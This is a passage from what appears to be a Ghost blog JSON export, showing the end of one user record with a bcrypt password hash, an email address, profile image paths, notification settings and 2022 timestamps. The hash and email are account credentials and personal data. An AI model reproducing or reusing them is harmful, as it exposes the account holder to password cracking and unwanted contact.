                        "password": "$2a$10$I/v0TdduxRqcWMpUJRBaPOHKvZ3JYN.Iftk4ivT4mMX4M2Rv1X6CS",
                        "email": "peakednessvip@163.com",
                        "profile_image": "__GHOST_URL__/content/images/2022/11/4455b975fec7d07de09928a3f2cdfbdd.png",
                        "cover_image": "__GHOST_URL__/content/images/2022/11/1fb44cda1877f120b10b72e89e58336d.png",
                        "bio": null,
                        "website": null,
                        "location": "Bermuda Triangle",
                        "facebook": null,
                        "twitter": null,
                        "accessibility": "{\"nightShift\":false,\"whatsNew\":{\"lastSeenDate\":\"2022-11-02T16:29:38.000+00:00\"}}",
                        "status": "active",
                        "locale": null,
                        "visibility": "public",
                        "meta_title": null,
                        "meta_description": null,
                        "tour": null,
                        "last_seen": "2022-11-22T03:26:41.000Z",
                        "comment_notifications": 1,
                        "free_member_signup_notification": 1,
                        "paid_subscription_started_notification": 1,
                        "paid_subscription_canceled_notification": 0,
                        "created_at": "2022-10-16T13:40:19.000Z",
                        "updated_at": "2022-11-22T03:26:41.000Z"
                    }
                ]
            }
        }
    ]
}